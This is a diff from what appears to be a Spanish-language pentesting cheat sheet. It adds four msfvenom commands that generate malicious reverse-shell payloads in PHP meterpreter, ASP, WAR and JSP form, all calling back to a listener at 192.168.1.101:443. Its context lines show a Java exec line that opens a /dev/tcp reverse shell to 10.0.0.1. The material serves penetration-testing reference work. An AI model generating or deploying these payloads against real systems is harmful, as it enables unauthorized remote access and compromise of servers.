@@ -1445,6 +1445,28 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 p.waitFor()
 ```
 
+Así mismo, podemos hacer uso de Metasploit para la creación de nuestros archivos maliciosos:
+
+**PHP (Metasploit)**
+```bash
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
+```
+
+**ASP (No Metasploit)**
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp
+```
+
+**WAR (Sesión vía Netcat)**
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
+```
+
+**JSP (Sesión vía Netcat)**
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
+```
+
 #### Spawning a TTY Shell
 
 Aunque en el apartado de **Tratamiento de la TTY** en la sección de Pentesting para Linux, detallo una técnica para mejorar y construir una Shell totalmente interactiva, sí que es cierto que hay varias formas de hacer un spawning de la pseudo-consola. Detallo a continuación algunas de ellas:
